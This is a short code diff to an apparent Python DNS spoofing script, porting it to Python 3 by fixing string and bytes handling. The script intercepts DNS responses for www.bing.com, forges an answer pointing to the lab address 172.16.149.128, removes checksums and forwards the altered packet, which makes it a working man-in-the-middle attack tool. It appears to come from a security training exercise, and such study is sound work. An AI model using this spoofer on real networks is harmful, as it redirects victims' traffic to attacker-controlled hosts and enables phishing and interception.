@@ -11,7 +11,7 @@ def process_packet(packet):
     # see if scapy has a DNS response
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if "www.bing.com" in qname:
+        if "www.bing.com" in qname.decode():
             print("[+] Spoofing Target")
             # use scapy to create dns response and asnwer count
             answer = scapy.DNSRR(rrname=qname, rdata="172.16.149.128")
@@ -25,7 +25,7 @@ def process_packet(packet):
             del scapy_packet[scapy.UDP].chksum
 
             # set the packet so the modified packet gets forwarded
-            packet.set_payload(str(scapy_packet))
+            packet.set_payload(bytes(scapy_packet))
 
 
     # print(scapy_packet.show())
